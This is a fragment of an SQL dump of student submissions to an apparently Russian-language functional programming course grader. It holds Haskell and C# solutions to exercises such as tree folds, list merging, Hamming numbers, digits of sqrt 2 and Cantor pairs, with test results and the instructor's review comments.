(3126, 89, '355679', '2012-11-03 20:43:14', 2, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\n\r\n\r\n-- отличие от fold(r|l) для списков в том, что ф-я f должна принимать три параметра: --\r\n\r\n-- значение в вершине и 2 результата для детей, что вполне логично --\r\n\r\n\r\n\r\nfoldTree _ res Empty = res\r\n\r\nfoldTree f res (Node a t1 t2) = let {\r\n\r\n    res1 = foldTree f res t1;\r\n\r\n    res2 = foldTree f res t2;\r\n\r\n  } in (\r\n\r\n    f a res1 res2\r\n\r\n  )\r\n\r\n\r\n\r\ntestTree = (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))\r\n\r\n\r\n\r\nasList = foldTree (x l r -> x : l ++ r) []\r\n\r\nsumTree = foldTree (x l r -> x + l + r) 0\r\n\r\nproductTree = foldTree (x l r -> x * l * r) 1\r\n\r\n\r\n\r\n-- либо можно добавить в конце "минус один", смотря что мы хотим посчитать: --\r\n\r\n-- количество узлов или ребер в самой длинной ветке --\r\n\r\nheight = foldTree (x l r -> max l r + 1) 0\r\n\r\n\r\n\r\nsumPos = foldTree (x l r -> l + r + (if x > 0 then x else 0)) 0\r\n\r\n\r\n\r\n-- это ведь не то же самое, что испотльзование операции "++" ?\r\n\r\nflatten = foldTree (x l r -> x : (foldэтоr (:) r l) ) []\r\n  --- Это то же самое, конечно. Проблема ведь не в буковках ++,\r\n  --- а в том, что вы будете несколько раз вызывать ++ \r\n  --- (или foldr (:) ) и несколько раз переписывать\r\n  --- список (все больший и больший). В данной задача, честно сказать,\r\n  --- это не то чтобы очень принципиально, но всетаки неэффективно.\r\n  --- а можно придумать так, чтобы каждый элемент записывался и итоговый\r\n  --- список только один раз, без лишних переписываний.\r\n  --- Дававйте так, я вам помечу задау, как незачтенную, но безусловно\r\n  --- если более оптимальный вариант не придумается, я ее засчитаю, просто\r\n  --- пришлите ее тогда еще раз. \r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3127, 90, '355679', '2012-11-03 20:52:37', 1, 'data Result = EmptyList | AllCountsAreEqual | Result Int\r\n\r\n\r\n\r\ninstance Show Result where\r\n\r\n	show AllCountsAreEqual = "Все элементы представлены в списке одинаковое количество раз!"\r\n\r\n	show EmptyList = "Списко-то пустой! О чём мы вообще говорим? Не понимаю..."\r\n\r\n	show (Result i) = show i\r\n\r\n\r\n\r\n-- считает количество вхождений элемента в список\r\n\r\ncountEntries x = length . (filter (==x))\r\n\r\n\r\n\r\nmostCommonElem xs = (foldr\r\n\r\n		(curElem (prevElem, prevCount) -> let {\r\n\r\n				curCount = countEntries curElem xs\r\n\r\n			} in (\r\n\r\n				if (curCount > prevCount) then\r\n\r\n					(curElem, curCount)\r\n\r\n				else\r\n\r\n					(prevElem, prevCount)\r\n\r\n			)\r\n\r\n		)\r\n\r\n		(0,0)\r\n\r\n		xs\r\n\r\n	)\r\n\r\n\r\n\r\nfindSame [] = EmptyList\r\n\r\nfindSame xs = let {\r\n\r\n		(elem, count) = mostCommonElem xs\r\n\r\n	} in (\r\n\r\n		if (count == 0 || (count == 1 && length xs > 1)) then\r\n\r\n			AllCountsAreEqual\r\n\r\n		else\r\n\r\n			Result elem\r\n\r\n	)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3128, 82, '355679', '2012-11-03 20:56:21', 0, '-- ну да, я опечатался в логической функции. элемент надо включать , если хоть одна его ипостась представлена в списке, а не обе.\n\ncountDifferentVars pairs vars = length (\n\n    foldr\n\n      ((u,v) res -> let {\n\n          elemU = elem u vars;\n\n          elemV = elem v vars;\n\n          removeAll = filter (x -> x /= u && x /= v) res;\n\n        } in (\n\n          if (elemU || elemV) then\n\n            u:removeAll\n\n          else\n\n            removeAll\n\n        )\n\n      )\n\n      vars\n\n      pairs\n\n  )\n\n\n\ntest = countDifferentVars [("x","y"),("y","z"), ("n","m")] ["x","w","y","z","x","n","m"] == 3\n\n\n', 'Выражение имеет неправильное значение: countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]'),
(3129, 82, '355679', '2012-11-03 21:29:40', 1, 'countDifferentVars [] vars = length vars\r\n\r\ncountDifferentVars _ [] = 0 \r\n\r\ncountDifferentVars ((u,v):pairs) vars =	let {\r\n\r\n		elemU = elem u vars;\r\n\r\n		elemV = elem v vars;\r\n\r\n		filteredVars = filter (x -> x /= u && x /= v) vars;\r\n\r\n		filteredPairs = map\r\n\r\n			((u1,v1) ->\r\n\r\n				if u1 == v then\r\n\r\n					(u, v1)\r\n\r\n				else if v1 == v then\r\n\r\n					(u1, u)\r\n\r\n				else\r\n\r\n					(u1,v1)\r\n\r\n			)\r\n\r\n			pairs;\r\n\r\n	} in (\r\n\r\n		countDifferentVars filteredPairs (u:filteredVars)\r\n\r\n	)\r\n\r\n\r\n\r\n \r\n\r\ntest1 = countDifferentVars [("x","y"),("y","z"), ("n","m")] ["x","w","y","z","x","n","m"] == 3\r\n\r\ntest2 = countDifferentVars [([''x''],[''y''])] [[''x'']] == 1\r\n\r\ntest3 = countDifferentVars [(1,3),(2,3)] [1,4,2,3,1] == 2\r\n\r\ntest = test1 && test1 && test3\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3130, 91, '355679', '2012-11-03 22:01:04', 1, 'merge (x1:list1) (x2:list2) = let {\r\n\r\n		x = min x1 x2;\r\n\r\n		newList1 = if x1 == x then list1 else x1:list1;\r\n\r\n		newList2 = if x2 == x then list2 else x2:list2;\r\n\r\n	} in (\r\n\r\n		x : (merge newList1 newList2)\r\n\r\n	)\r\n\r\n\r\n\r\nmerge xs [] = xs\r\n\r\nmerge _ xs = xs\r\n\r\n\r\n\r\ntest1 = (merge [1,4,8] [2,4,5,10,20]) == [1,2,4,5,8,10,20]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3131, 77, '383483', '2012-11-03 22:50:53', 1, 'sqrt2 = 1:[cnum 1 n 10| n<-[1..]]\r\ncnum res 0 m = mod res 10\r\ncnum res n m = cnum (res*10+(checkDig 0 (res*10) m)) (n-1) (m*10)\r\ncheckDig 9 res m = 9\r\ncheckDig i res m = let x = (res+i)^2\r\n                       y = (res+i+1)^2 in if ((x <= 2*m*m) && (y > 2*m*m)) then i else checkDig (i+1) res m\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3132, 79, '383483', '2012-11-03 23:14:58', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _19_1\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<int> digits(int n)\r\n        {\r\n            int r = 1;\r\n            for (int i = 1; ; i++)\r\n            {\r\n                yield return (10 * r) / n;\r\n                r = (10 * r) % n;\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int i = 0;\r\n            foreach (int z in digits(7))\r\n            {\r\n                Console.Write("{0} ", z);\r\n                i++;\r\n                if (i > 100)\r\n                    break;\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(3133, 80, '383483', '2012-11-03 23:31:58', 2, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _19_2\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<string> cantor()\r\n        {\r\n            for (int i = 1; ; i++)\r\n            {\r\n                for (int j = 1; j < i; j++)\r\n                {\r\n                    yield return "(" + j.ToString() + "," + (i - j).ToString() + ")";\r\n   --- Лучше, на самом деле возвращать не строчку, а именно пару чисел. Можно использовать\r\n   --- стандартные типы Tuple или KetValuePair. Или можно описать свой простой класс.\r\n   --- Исправьте, пожалуйста, это просто.. \r\n                }\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int i = 0;\r\n            foreach (string x in cantor())\r\n            {\r\n                Console.Write(x);\r\n                i++;\r\n                if (i > 100)\r\n                    break;\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3134, 77, '472848', '2012-11-03 23:48:52', 1, 'sqrt2 = 1 : f 1 2\r\nf acc val = let dig = g (acc * 10) (val * 100) in dig : f (acc * 10 + dig) (val * 100)\r\ng acc val = let i = acc + 1 in if (val < i * i) then 0 else 1 + g i val', '<br/>Тесты успешно пройдены!'),
(3135, 84, '472848', '2012-11-04 00:03:39', 1, 'public static IEnumerable<double> Iterate(double x, Func<double, double> f)\r\n{\r\n  double res = x;\r\n  while (true)\r\n  {\r\n    yield return res;\r\n    res = f(res);\r\n  }\r\n}\r\n\r\nstatic void Main(string[] args)\r\n{\r\n  foreach (double x in Iterate(2, x => x * 2))\r\n  {\r\n    Console.WriteLine(x);\r\n    if (x > 1000000)\r\n      break;\r\n  }\r\n\r\n  int i = 0;\r\n  foreach (double x in Iterate(1, Math.Sin))\r\n  {\r\n    Console.WriteLine(x);\r\n    if (i++ == 100)\r\n      break;\r\n  }\r\n}', '<br/>Тесты успешно пройдены!'),
(3136, 82, 'erwert', '2012-11-04 01:35:06', 0, 'countDifferentVars c [] = 0\r\ncountDifferentVars c l = countDifferentVars c (dfs c l [head l]) + 1\r\n\r\ndfs c l [] = l\r\ndfs c l (h:hs) = dfs c newl (hs ++ next)\r\n	where\r\n		newl = [t | t <- l, t /= h]\r\n		next = map ((a, b) -> if a == h then b else a) (filter ((a,b) -> (a == h || b == h) && (elem a newl || elem b newl)) c)', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3137, 82, 'erwert', '2012-11-04 01:46:26', 1, 'countDifferentVars c [] = 0\r\ncountDifferentVars c l = countDifferentVars c (dfs c l [head l] []) + 1\r\n\r\nabc a b c \r\n	| a == c = b\r\n	| otherwise = a\r\n\r\ndfs c l [] bl = l\r\ndfs c l (h:hs) bl = dfs c newl (hs ++ next) (h:bl)\r\n	where\r\n		newl = [t | t <- l, t /= h]\r\n		next = map ((a, b) -> abc a b h) (filter ((a,b) -> (a == h || b == h) && (not $ elem (abc a b h) bl)) c)', '<br/>Тесты успешно пройдены!'),
(3138, 93, '517309', '2012-11-04 05:15:37', 0, 'merge (x:xs) (y:ys) = if x<y then x:merge xs (y:ys) else \r\n                      if x>y then y:merge (x:xs) ys else\r\n                      x:merge xs ys\r\n\r\nham = 1: merge (map (*3) ham) (map (*10) ham)\r\n', 'Выражение имеет неправильное значение: ham !! 10000'),
(3139, 93, '517309', '2012-11-04 05:19:32', 2, 'merge (x:xs) (y:ys) = if x<y then x:merge xs (y:ys) else \r\n                      if x>y then y:merge (x:xs) ys else\r\n                      x:merge xs ys\r\n\r\nham = 1: merge (map (*3) ham) (map (*10) ham)\r\n', '<br/>Тесты успешно пройдены!'),
(3140, 89, '355679', '2012-11-04 08:18:08', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a)\r\n\r\n\r\n\r\ntestTree = (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))\r\n\r\n\r\n\r\nflatten tree = flatten'' tree []\r\n\r\nflatten'' Empty result = result\r\n\r\nflatten'' (Node x l r) result = x : (flatten'' l (flatten'' r result))\r\n\r\n\r\n\r\ntest = flatten testTree == [1..3]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3141, 93, 'Deutsche', '2012-11-04 08:19:59', 0, 'ham = ham1 0 0\r\n-- порядок генерации чисел 3^i*10^j: по диагоналям вида i+2j=n, n=0.., j=0..n`div`2 снизу вверх справа налево\r\nham1 n j = if (j>n `div` 2)\r\n		then ham1 (n+1) 0\r\n	   else (3^(n-2*j)*10^j):ham1 n (j+1)\r\n-- я уверен, что числа идут по возрастанию, однако 10000-й элемент не такой, как в примере...\r\n-- возможно, я в чём-то ошибаюсь... (хотя работает быстро:) \r\n-- хотя примерно ответ именно в том же районе, так что возможно индекс немного сбит...\r\n', 'Выражение имеет неправильное значение: ham !! 5000'),
(3142, 93, 'Deutsche', '2012-11-04 08:48:28', 2, '-- Прошу прощения, там всё-таки у меня ошибка', 'Не удалось вычислить выражение "take 10 ham", проверьте правильность синтаксиса'),
(3143, 80, '383483', '2012-11-04 11:51:18', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace _19_2\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<Tuple<int,int>> cantor()\r\n        {\r\n            for (int i = 1; ; i++)\r\n            {\r\n                for (int j = 1; j < i; j++)\r\n                {\r\n                    yield return Tuple.Create<int, int>(j, i - j);\r\n                }\r\n            }\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int i = 1;\r\n            foreach (Tuple<int,int> x in cantor())\r\n            {\r\n                Console.Write(x);\r\n                i++;\r\n                if (i > 100)\r\n                    break;\r\n            }\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3144, 77, '397095', '2012-11-04 12:34:08', 1, 'makeNumber xs n = sum (zipWith (*) xs (map (x -> 10 ^ (n - x)) [1..n]))\r\n\r\nsqrt2 = map func [1..]\r\n\r\nfunc 1 = 1\r\nfunc n = last [i | i <- [0..9], let x = 10 * (makeNumber sqrt2 (n-1)) + i, x * x < (2 * 100 ^ (n - 1))]', '<br/>Тесты успешно пройдены!'),
(3145, 78, '63706456', '2012-11-04 12:41:01', 1, 'pascal = [1]: (zipWith (zipWith (+)) (map (++[0]) pascal) (map (0:) pascal))', '<br/>Тесты успешно пройдены!'),
(3146, 80, '397095', '2012-11-04 12:53:54', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace FunctionalProgramming\r\n{\r\n	class Pair<F, S>\r\n	{\r\n		public F First { get; set; }\r\n		public S Second { get; set; }\r\n	}\r\n	\r\n	class Cantor\r\n	{\r\n		\r\n		static IEnumerable<Pair<int,int>> cantor() \r\n		{\r\n			for (int n = 1; ; n++)\r\n			{\r\n				for (int i = 1; i <= n; i++)\r\n				{\r\n					Pair<int,int> p = new Pair<int,int>();\r\n					p.First = n - i + 1;\r\n					p.Second = i;\r\n					yield return p;\r\n				}\r\n			}\r\n		}\r\n\r\n		static void Main(string[] args) \r\n		{\r\n			int count = 100;\r\n			foreach (Pair<int,int> p in cantor())\r\n			{\r\n				if (count-- == 0) break;\r\n				Console.WriteLine("({0}, {1})", p.First, p.Second);\r\n			}\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3147, 93, '2562137', '2012-11-04 13:24:59', 1, 'pows3 = 1 : map (*3) pows3\r\n\r\npows10 = pows3 : map (map (*10)) pows10\r\n\r\n\r\n\r\nextractHeads (list:lists) lim = \r\n\r\n	if (head list) <= lim then (head list) : extractHeads lists lim else []\r\n\r\n\r\n\r\nremoveHead (list:lists) e =\r\n\r\n	if (head list) == e then (tail list) : lists else list : removeHead lists e\r\n\r\n\r\n\r\nmergelist lists last =\r\n\r\n	e : mergelist (removeHead lists e) (e * 3) where e = minimum (extractHeads lists last)\r\n\r\n\r\n\r\nham = mergelist pows10 1\r\n\r\n\r\n\r\ntest = (\r\n\r\n	take 10 ham\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(3148, 82, 'hasp', '2012-11-04 13:28:33', 0, 'import Data.Set  hiding (filter)\r\nimport Data.List hiding (delete, insert) \r\n\r\nmyS = "12345" --считаю, что есть строка, точно не явл. именем переменной; иначе ее можно получить по списку l, напр., взяв строку 11.. длину большей, чем любой элемент списка\r\n\r\nfactorOut [] acc = acc\r\nfactorOut ((l,r):xs) acc = case (find (s -> (member l s) || (member r s) ) (elems acc)) of \r\n								{(Just s) -> factorOut xs (insert (insert r (insert l s)) (delete s acc)); (Nothing) -> factorOut xs (insert (insert r (singleton l)) acc)}\r\n								\r\ncountDifferentVars :: [(String, String)] -> [String] -> Int\r\ncountDifferentVars a l = let cls = factorOut a empty in \r\n						 let k = foldl (acc x -> case (find (y -> member x y) (elems acc)) of {(Just s) -> (insert (insert myS s)(delete s acc)); (Nothing) -> insert (insert myS (singleton x)) acc}) cls l in\r\n						 length (filter (member myS) (elems k))\r\n', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3149, 82, 'hasp', '2012-11-04 13:30:16', 0, 'import Data.Set  hiding (filter)\r\nimport Data.List hiding (delete, insert) \r\n\r\nmyS = [''1'',''2'',''3''] --считаю, что есть строка, точно не явл. именем переменной; иначе ее можно получить по списку l, напр., взяв строку 11.. длину большей, чем любой элемент списка\r\n\r\nfactorOut [] acc = acc\r\nfactorOut ((l,r):xs) acc = case (find (s -> (member l s) || (member r s) ) (elems acc)) of \r\n								{(Just s) -> factorOut xs (insert (insert r (insert l s)) (delete s acc)); (Nothing) -> factorOut xs (insert (insert r (singleton l)) acc)}\r\n								\r\ncountDifferentVars :: [(String, String)] -> [String] -> Int\r\ncountDifferentVars a l = let cls = factorOut a empty in \r\n						 let k = foldl (acc x -> case (find (y -> member x y) (elems acc)) of {(Just s) -> (insert (insert myS s)(delete s acc)); (Nothing) -> insert (insert myS (singleton x)) acc}) cls l in\r\n						 length (filter (member myS) (elems k))\r\n', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3150, 93, 'Deutsche', '2012-11-04 13:30:54', 1, '   --- ОК, очень хорошо!\r\n   --- Просто как замечание, можно придумать, как использовать typing the knot (с одной вспомогательной\r\n   --- функцией), тобы получилось короче. Но неважно, у вас тоже замечательно..\r\nimport Data.List\r\nham = 1:3:9:10:hamm 1 [1, 3, 9, 10]\r\nhamm k s = let \r\n		s1 = (qwerty s k False)\r\n	   in if (10^k `elem` s1) \r\n		then ((drop 3 s1)++(hamm (k+1) s1))\r\n	      else ((drop 3 s1)++(hamm k s1))\r\n\r\nqwerty [] k _ = []\r\nqwerty (x:s) k b = if (x*3<10^k) then (x*3):qwerty s k False\r\n     		    else if (not b)\r\n			 then (10^k):(x*3):qwerty s k True\r\n		    else (x*3):qwerty s k True', '<br/>Тесты успешно пройдены!'),
(3151, 82, 'hasp', '2012-11-04 13:38:08', 2, '  --- Что-то у вас не совсем правильно..\r\n  --- Например, countDifferentVars [("a","b"),("c","d"),("c","a")] ["a","b","c","d"]\r\n  --- дает 2 а дб 1 \r\nimport Data.Set  hiding (filter)\r\nimport Data.List hiding (delete, insert) \r\n\r\nmyS = "12345" \r\n\r\nfactorOut [] acc = acc\r\nfactorOut ((l,r):xs) acc = case (find (s -> (member l s) || (member r s) ) (elems acc)) of \r\n								{(Just s) -> factorOut xs (insert (insert r (insert l s)) (delete s acc)); (Nothing) -> factorOut xs (insert (insert r (singleton l)) acc)}\r\n								\r\ncountDifferentVars a l = let cls = factorOut a empty in \r\n						 let k = foldl (acc x -> case (find (y -> member x y) (elems acc)) of {(Just s) -> (insert (insert myS s)(delete s acc)); (Nothing) -> insert (insert myS (singleton x)) acc}) cls l in\r\n						 length (filter (member myS) (elems k))', 'Не удалось вычислить выражение "countDifferentVars [([''x''],[''y''])] [[''x'']]", проверьте правильность синтаксиса'),
(3152, 77, '63706456', '2012-11-04 13:47:01', 1, 'numFromList = foldl (x y -> x*10 + y) 0\r\n\r\nsqrt2 = 1: [x | n <- [1..], \r\n		x <- [0..9], \r\n		let val = (numFromList (take n sqrt2)) * 10 + x, \r\n		let compareWith2 y = div (y^2) (10^(2*n)) < 2,\r\n		compareWith2 val, \r\n		not (compareWith2 (val+1))]', '<br/>Тесты успешно пройдены!'),
(3153, 84, 'erwert', '2012-11-04 14:40:26', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\nusing System.Threading.Tasks;\r\n\r\nnamespace ConsoleApplication4\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<double> Iterate(double n, Func <double, double> f)\r\n        {\r\n            for(double res = n; ; res = f(res))\r\n                yield return res;\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            int i = 0;\r\n            foreach (double x in Iterate(1, Math.Sin))\r\n            {\r\n                Console.WriteLine(x);\r\n                if (i++ == 100)\r\n                    break;\r\n            }\r\n            Console.Read();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3154, 83, 'erwert', '2012-11-04 14:41:02', 0, '        public static IEnumerable<int> Lst239()\r\n        {\r\n            int j, t, nl;\r\n            yield return 2;\r\n            foreach (int l in Lst239())\r\n            {\r\n                j = 0;\r\n                nl = l;\r\n                while( nl > 0 && nl % 10 == 9) {\r\n                    j = j * 10 + 2;\r\n                    nl /= 10;\r\n                }\r\n                if (nl == 0)\r\n                    nl = 2 * (int) Math.Pow(10, Math.Ceiling(Math.Log10((double)j))) + j;\r\n                else\r\n                {\r\n                    t = (nl % 10 == 2) ? 3 : 9;\r\n                    nl = ((nl / 10) * 10 + t);\r\n                    if (j > 0)\r\n                        nl = nl * (int) Math.Pow(10, Math.Ceiling(Math.Log10((double)j))) + j;\r\n                }\r\n                yield return nl;\r\n            }\r\n        }', '<br/>Тесты успешно пройдены!'),
(3155, 81, 'hasp', '2012-11-04 15:08:34', 1, 'import Data.List\r\n	\r\ndigs r = length (show r)			\r\nfoo l = (map (e->e + 2*10^(digs e)) l) ++ (map (e->e + 3*10^(digs e)) l) ++ (map (e->e + 9*10^(digs e)) l)\r\n   --- Как вариант, вы могли бы приписывать цифры не слева, а справа, было бы гораздо проще.. \r\nlst239 = concat (snd (mapAccumL (acc _ -> (foo acc, acc) ) [2,3,9] [1..]))\r\n', '<br/>Тесты успешно пройдены!'),
(3156, 93, '12206137', '2012-11-04 16:20:18', 1, 'merge (f@(x:xs)) (s@(y:ys)) =\r\n\r\n    if x < y then x : merge xs s\r\n\r\n    else if y < x then y : merge f ys\r\n\r\n    else x : merge xs ys\r\n\r\n\r\n\r\nham = 1 : merge (map (* 3) ham) (map (* 10) ham)\r\n', '<br/>Тесты успешно пройдены!'),
(3157, 78, '1705225', '2012-11-04 18:08:14', 1, 'pascal = iterate (xs -> zipWith (+) ([0] ++ xs) (xs ++ [0])) [1]', '<br/>Тесты успешно пройдены!'),
(3158, 94, '12206137', '2012-11-04 18:15:49', 1, '--Some examples in the end\r\n\r\n\r\n\r\n(|>) x f = f x\r\n\r\n\r\n\r\nreduce f (x:xs) = foldl f x xs\r\n\r\n\r\n\r\ndata (Num r, Show r) => Scheme r =\r\n\r\n    Parallel (Scheme r) (Scheme r)\r\n\r\n  | Series (Scheme r) (Scheme r)\r\n\r\n  | Single r\r\n\r\n\r\n\r\nnormalize l1 l2 =\r\n\r\n    let dl = length l1 - length l2 in\r\n\r\n    if dl < 0 then\r\n\r\n        (l1 ++ replicate (-dl) (concat $ replicate (length $ head l1) " "), l2)\r\n\r\n    else if dl > 0 then\r\n\r\n        (l1, l2 ++ replicate dl (concat $ replicate (length $ head l2) " "))\r\n\r\n    else (l1,l2)\r\n\r\n\r\n\r\nseparate sep x y = concat [x,sep,y]\r\n\r\nappend cnt ch str =\r\n\r\n    if cnt > 0 then concat $ str : replicate cnt ch\r\n\r\n    else str\r\n\r\n\r\n\r\nprintScheme (Single r) = [show r]\r\n\r\nprintScheme (Series s1 s2) =\r\n\r\n    let\r\n\r\n        ((x:xs), (y:ys)) = normalize (printScheme s1) (printScheme s2)\r\n\r\n    in\r\n\r\n    separate "-" x y : zipWith (separate " ") xs ys\r\n\r\n\r\n\r\nprintScheme (Parallel s1 s2) =\r\n\r\n    let\r\n\r\n        (x:xs) = printScheme s1\r\n\r\n        (y:ys) = printScheme s2\r\n\r\n        (dx,dy,len) =\r\n\r\n            let l1 = length x in\r\n\r\n            let l2 = length y in\r\n\r\n            let maxLen = max l1 l2 in\r\n\r\n            (maxLen - l1, maxLen - l2, maxLen)\r\n\r\n    in\r\n\r\n    (concat ["+-", append dx "-" x,"-+"])\r\n\r\n    :  (xs |> map (x -> concat ["| ", append dx " " x," |"]))\r\n\r\n    ++ [concat ["| ", append len " " ""," |"]]\r\n\r\n    ++ [concat ["+-", append dy "-" y,"-+"]]\r\n\r\n    ++ (ys |> map (y -> concat ["  ", append dy " " y,"  "]))\r\n\r\n\r\n\r\ninstance (Num r, Show r) => Show (Scheme r) where\r\n\r\n    show = reduce (separate "\r\n") . printScheme\r\n\r\n\r\n\r\ne0 = \r\n\r\n                (Parallel\r\n\r\n                    (Single 3)\r\n\r\n                    (Single 100)\r\n\r\n                )\r\n\r\n\r\n\r\ne1 = \r\n\r\n            (Series\r\n\r\n                (Parallel\r\n\r\n                    (Single 3)\r\n\r\n                    (Single 100)\r\n\r\n                )\r\n\r\n                (Single 5)\r\n\r\n            )\r\n\r\n\r\n\r\nexample0 =\r\n\r\n    Parallel\r\n\r\n        (Series\r\n\r\n            (Single 4)\r\n\r\n            (Series\r\n\r\n                (Single 10000)\r\n\r\n                (Single 5)\r\n\r\n            )\r\n\r\n        )\r\n\r\n        (Parallel\r\n\r\n            (Single 5)\r\n\r\n            (Single 6)\r\n\r\n        )\r\n\r\n\r\n\r\nexample =\r\n\r\n    Parallel\r\n\r\n        (Series\r\n\r\n            (Single 4)\r\n\r\n            (Series\r\n\r\n                (Parallel\r\n\r\n                    (Single 3)\r\n\r\n                    (Single 100)\r\n\r\n                )\r\n\r\n                (Single 5)\r\n\r\n            )\r\n\r\n        )\r\n\r\n        (Parallel\r\n\r\n            (Single 5)\r\n\r\n            (Single 6)\r\n\r\n        )\r\n', '<br/>Тесты успешно пройдены!'),
(3159, 79, '5772638', '2012-11-04 18:28:10', 1, ' class Program\r\n\r\n    {\r\n     \r\n        public static IEnumerable<int> digits (int n )\r\n        {\r\n            int mod=1, div, del;\r\n            for (int i=1; ;i++ )\r\n            {\r\n                del = mod * 10;\r\n                div = del / n;\r\n                mod = del % n;\r\n                yield return div;\r\n            }\r\n        }\r\n\r\n        \r\n        static void Main(string[] args)\r\n        {\r\n            int tt = 1, n;\r\n            Random rand = new Random();\r\n            n = rand.Next(1, 100);\r\n            Console.WriteLine(n);\r\n            foreach (int x in digits(n))\r\n            {\r\n                Console.Write(x+ " ");\r\n                tt++;\r\n                if (tt > 100)\r\n                    break;\r\n            }\r\n            Console.ReadKey();\r\n        }\r\n    }', '<br/>Тесты успешно пройдены!'),
(3160, 77, '374969', '2012-11-04 18:35:18', 1, 'f (b, c) = n : f (20*n+10*b, 100*c-100*b*n-100*n*n) where n =(last . takeWhile (x -> x*x + b*x < c)) [0..9]\r\nsqrt2 = f (0, 2)', '<br/>Тесты успешно пройдены!'),
(3161, 80, '5772638', '2012-11-04 18:54:10', 2, 'class Program\r\n    {\r\n        public static List <int[]> allConst(int cnst)\r\n        {\r\n            List<int[]> res = new List<int[]>();\r\n            for (int i = 1; i < cnst;i++ ) \r\n            {\r\n                for (int j = 1; j < cnst;j++ ) \r\n                {\r\n                    if (i + j == cnst)\r\n\r\n                    {\r\n\r\n                        int[] pair = new int[2];\r\n\r\n                        pair[0] = i;\r\n\r\n                        pair[1] = j;\r\n\r\n                        res.Add(pair);\r\n\r\n                    }\r\n\r\n                }\r\n\r\n            }\r\n\r\n            return res;\r\n\r\n        }\r\n\r\n\r\n\r\n\r\n\r\n        public static IEnumerable<List<int[]>> Kantor ( )\r\n\r\n        {\r\n\r\n            \r\n\r\n            for (int i=2; ;i++ )\r\n\r\n            {\r\n\r\n                yield return allConst(i);\r\n        --- Интересная идея, но это немного не по условию. Надо же было выдавать последовательность пар.\r\n        --- Попробуйте переделать пожалуйста. Как-то так\r\n        ---  - вот тут, в это месте еще циклы, точно такие, как у вас в allConst\r\n        ---  - но только вместо того, чтобы пару добавлять в какой-то список, вы прямо пишите\r\n        ---     yield return pair;\r\n        ---  - тип соответственно должен быть IEnumerable<int[]>\r\n        ---  - ну и Main придется соотвественно переделать.\r\n        ---  Попробуйте, пожалуйта, скажем, до среды включительно. Если будут какие-то проблемы - пишите..\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        \r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int tt = 1, l;\r\n\r\n            foreach (List<int[]> x in Kantor())\r\n\r\n            {\r\n\r\n                l = x.Count;\r\n\r\n                foreach(int[] pair in x)\r\n\r\n                {\r\n\r\n                    Console.Write("(" + pair[0] + ", " + pair[1] + ") ");\r\n\r\n                }\r\n\r\n                \r\n\r\n                Console.WriteLine();\r\n\r\n                tt++;\r\n\r\n                if (tt > 10)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }', '<br/>Тесты успешно пройдены!'),
(3162, 77, '1705225', '2012-11-04 19:31:41', 2, 'powers = 1:map(*10) powers\r\nnext i = mod (truncate $ i * (sqrt 2)) 10\r\n   --- Нет, так не получиться. Потому что как только вы написали sqrt 2, вы уже никак не \r\n   --- можете получить больше 15 правильных знаков, в Double больше никак не влезет.\r\n   --- См на эту тему http://vk.com/wall-41863301_99\r\n   --- Если хотите, можете попробовать дописать, скажем до вторника включительно\r\n\r\nsqrt2 = map (x -> next x) powers\r\n', 'Выражение имеет неправильное значение: take 20 sqrt2'),
(3163, 93, '2118411', '2012-11-04 20:42:25', 1, 'merge [] ys = ys\r\nmerge xs [] = xs\r\nmerge (x:xs) (y:ys)\r\n        | x < y = x:(merge xs (y:ys))\r\n        | y < x = y:(merge (x:xs) ys)\r\n        | otherwise = x:(merge xs ys)\r\n\r\nseq3 start = start:(seq3 (start*3))\r\nseqAll start = start:(merge (seq3 (start*3)) (seqAll (start*10)))\r\nham = seqAll 1\r\n', '<br/>Тесты успешно пройдены!'),
